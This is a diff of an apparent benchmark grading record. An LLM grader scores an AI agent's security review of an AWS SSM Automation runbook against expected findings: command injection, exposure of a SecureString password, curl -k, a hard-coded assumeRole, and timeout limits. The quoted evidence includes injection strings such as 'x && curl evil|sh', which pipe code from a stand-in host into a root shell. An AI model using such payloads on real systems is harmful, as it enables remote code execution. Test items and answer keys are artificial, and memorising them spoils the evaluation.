@@ -10,7 +10,7 @@
     "trigger": null,
     "expected_output": {
       "result": "failed",
-      "reasoning": "The agent's response covers many of the required points well: command injection via LogPath with weak '.*' pattern (critical), DbPassword as SecureString being invalid + echoed (critical, without repeating the value), curl -k disabling TLS, hard-coded assumeRole, missing InstanceId validation, and onFailure: Continue on RotateLogs. These match the expected output closely.\n\nHowever, several specific required findings are missing or handled differently than expected:\n1. The expected output specifically calls for noting \"timeoutSeconds 1200 above the 600-second aws:executeScript maximum\" - the agent's response mentions the 1200s timeout is \"excessive\" (item 10) but never states the specific 600-second maximum limit for aws:executeScript, which is a concrete technical fact that should have been cited.\n2. The expected output calls for noting \"onCancel routed to an aws:sleep step, which isn't a valid cancel target\" - the agent flags onCancel: step:Wait as a problem (item 10, \"keeps the workflow running after someone cancels it\") but does not identify that routing onCancel to aws:sleep is specifically an invalid cancel target per SSM rules. The agent's framing is different (behavioral concern vs. validity concern).\n3. The hardened version removes the CheckHealth aws:executeScript step entirely (replacing it with aws:waitForAwsResourceProperty), so the required fix of \"lowered timeout to 600\" for that step is never actually applied since the step type changed - this diverges from the expected approach of fixing the timeout value specifically to 600s on the executeScript step.\n4. The expected output calls for \"a Parameter Store name parameter read at run time\" for the DB password - the agent's hardened version removes DbPassword as a parameter entirely and suggests reading from Secrets Manager/Parameter Store via instance profile, but does not add an actual Parameter Store name parameter to the YAML.\n\nGiven these specific technical gaps (missing the 600s max citation, not identifying invalid onCancel target to aws:sleep specifically, not adding a Parameter Store name parameter in the hardened YA025, and removing the executeScript step rather than fixing its timeout), the response does not fully satisfy the detailed expected output criteria, despite covering most of the broader security issues well.",
+      "reasoning": "The agent's response covers most of the expected findings well: command injection via LogPath (critical), DbPassword SecureString issue without repeating the value (critical), missing InstanceId pattern, curl -k TLS issue, hardcoded assumeRole, onFailure: Continue noted as info, and produces a hardened YAML with anchored LogPath pattern, instance ID type constraint, assumeRole parameterized, and -k removed.\n\nHowever, several specific expected findings are missing or handled differently than specified:\n1. The expected output explicitly calls out \"timeoutSeconds 1200 above the 600-second aws:executeScript maximum\" - the agent never mentions this specific 600-second limit fact, though it does flag timeoutSeconds:1200 as 'excessive' (finding #9) without citing the actual hard limit. In the hardened version, CheckHealth timeout was changed to 60s (well under 600), so the numeric constraint issue is implicitly addressed but the specific \"600-second maximum\" reasoning is never stated.\n2. \"onCancel routed to an aws:sleep step, which isn't a valid cancel target\" - the agent does flag onCancel as \"meaningless\" (finding #10) but doesn't explicitly state why it's invalid (that Wait is not a valid target per the step ordering/cancel semantics) - it's somewhat addressed but not with the precise reasoning expected. In the hardened version, onCancel was simply removed (not fixed by making it valid), so it doesn't demonstrate it was \"fixed\" per se but removed.\n3. Expected output calls for \"a Parameter Store name parameter read at run time\" for DbPassword - but the agent's hardened version REMOVES DbPassword entirely rather than adding a Parameter Store name parameter that is read at runtime via SSM. The agent instead suggests in notes that the app should fetch the secret via instance profile, without adding an actual DbPasswordParameterName type parameter in the hardened YAML. This is a meaningful gap against the expected output's specific requirement.\n\nGiven that the expected output specifically requires a Parameter Store name parameter in the hardened YAML (not just removal with a note), and the explicit 600-second maximum fact for aws:executeScript timeout, and clearer treatment of onCancel invalidity, the response falls short of fully matching the detailed expected criteria, even though it is a thorough and largely overlapping review.",
       "confidence": "medium"
     },
     "assertions": {
@@ -19,72 +19,63 @@
           "text": "Flags LogPath as a command-injection risk because its pattern is '.*' and it is interpolated into a shell command",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "'Shell command injection through LogPath.' allowedPattern: '.*' accepts anything. Automation substitutes {{LogPath}} into the script before the shell sees it, so a value like /x; curl evil|sh # runs as root.",
-          "reasoning": "The agent explicitly flags LogPath's permissive pattern and its interpolation into the shell command as an injection risk.",
+          "evidence": "'`allowedPattern: '.*'` accepts anything. `LogPath` is pasted unquoted into a root shell as `rm -rf {{LogPath}}/*`. A value like `/`, `/var/log/app; <anything>`, or `x && curl evil|sh` runs as root on the instance.'",
           "confidence": "high"
         },
         {
           "text": "Flags SecureString as an invalid parameter type and recommends taking the Parameter Store parameter name instead",
           "evaluator": "llm",
           "passed": false,
-          "evidence": "'SecureString isn't a valid Automation parameter type... Parameter Store has SecureString, but Automation doesn't.' The fix removed the password entirely and recommended 'have it read the credential from Secrets Manager or Parameter Store through the instance profile.' No parameter was added to take a Parameter Store parameter name as input.",
-          "reasoning": "The agent flags SecureString as invalid (first half satisfied) but does not recommend taking a Parameter Store parameter name as a replacement parameter; instead it removes the password parameter entirely and suggests the instance fetch it via instance profile at runtime, which is a different approach than accepting a parameter name.",
-          "confidence": "medium"
+          "evidence": "Agent states: 'SecureString also isn't a supported Automation parameter type, so the document likely fails validation or doesn't protect the value. Don't pass the password through the runbook. Have the app fetch it at start from Parameter Store or Secrets Manager using the instance profile.' It flags SecureString as invalid but does NOT recommend taking the Parameter Store parameter name as an input parameter instead; it recommends removing the parameter entirely and having the app fetch the secret itself, not passing a parameter name through the runbook.",
+          "confidence": "high"
         },
         {
           "text": "Flags the echo of DbPassword as exposing a secret",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "'Echoing the password puts it in Run Command output, command history and any log destinations.'",
-          "reasoning": "Directly flags the echo as exposing the secret.",
+          "evidence": "'The password is exposed in the command.** `echo \"... {{DbPassword}}\"` puts the secret in command output, Run Command history, CloudWatch or S3 output, the process list, and the Automation execution record.'",
           "confidence": "high"
         },
         {
           "text": "Flags curl -k as disabling TLS verification",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "'curl -k disables TLS verification, so the call can be intercepted or spoofed.'",
-          "reasoning": "Explicitly flags this.",
+          "evidence": "'`curl -k` disables TLS verification.** This allows MITM on the notify call.'",
           "confidence": "high"
         },
         {
           "text": "Flags the hard-coded assumeRole ARN",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "'Hard-coded assumeRole with an account ID. It breaks for other teams and accounts... It should be a caller-supplied parameter.'",
-          "reasoning": "Clearly flags hard-coded ARN as an issue and fixes it with a parameter.",
+          "evidence": "'A hardcoded `assumeRole` is a privilege-escalation path.** Anyone who can start this runbook gets `AppOpsRole`'s permissions...'",
           "confidence": "high"
         },
         {
           "text": "Flags timeoutSeconds 1200 as above the aws:executeScript maximum of 600 seconds",
           "evaluator": "llm",
           "passed": false,
-          "evidence": "The agent's finding 10 says 'The 1200s timeout on a status check is also excessive' but does not mention the specific 600-second maximum for aws:executeScript or cite that limit.",
-          "reasoning": "The agent flags the timeout as excessive but never states the actual maximum of 600 seconds or that it exceeds a documented limit for aws:executeScript; it's a vague complaint about excess rather than citing the specific ceiling.",
-          "confidence": "medium"
+          "evidence": "Agent says only '`timeoutSeconds: 1200`** is excessive for these steps.' It never cites the 600 second maximum limit for aws:executeScript or states that 1200 exceeds any specific maximum; it just calls it excessive without referencing a hard limit.",
+          "confidence": "high"
         },
         {
           "text": "Flags onCancel routing to an aws:sleep step as invalid",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "'onCancel: step:Wait keeps the workflow running after someone cancels it.' and the hardened version replaces onCancel with Abort on CheckHealth/RotateLogs/RestartService.",
-          "reasoning": "The agent flags onCancel routing to the Wait step as problematic and removes it in the hardened version, treating it as invalid/unsafe.",
-          "confidence": "medium"
+          "evidence": "'`onCancel: step:Wait` is meaningless.** It runs a sleep on cancel.' This flags it as nonsensical/invalid usage.",
+          "confidence": "high"
         },
         {
           "text": "Returns a complete hardened document in YAML",
           "evaluator": "llm",
           "passed": true,
-          "evidence": "The response includes a full YAML document starting with 'schemaVersion: '0.3'' through the Notify step, with parameters, mainSteps, etc.",
-          "reasoning": "A complete hardened YAML document is present covering all steps.",
+          "evidence": "The output contains a full YAML document under 'Hardened runbook' with schemaVersion, parameters, and all mainSteps (RotateLogs, RestartService, Wait, CheckHealth, NotifyTeam) fully written out.",
           "confidence": "high"
         },
         {
           "text": "Cites a documentation page for findings",
           "evaluator": "llm",
           "passed": false,
-          "evidence": "No URLs or specific AWS documentation page citations appear anywhere in the response; the agent describes behavior narratively (e.g., 'Automation supports String, StringList, Boolean, Integer, MapList, StringMap and the AWS::* types') without linking or citing a doc page.",
-          "reasoning": "The agent describes SSM Automation parameter types and behaviors from knowledge but never cites or references a specific documentation page/URL for any finding.",
+          "evidence": "No documentation link or page citation appears anywhere in the output; all findings are explained in prose without any URL or reference to AWS docs.",
           "confidence": "high"
         },
         {
@@ -120,7 +111,7 @@
     "runtime": "0s",
     "cost": "$0.00",
     "context_window": {
-      "utilization": "4.2%",
+      "utilization": "4.3%",
       "compaction_count": 0
     }
   }
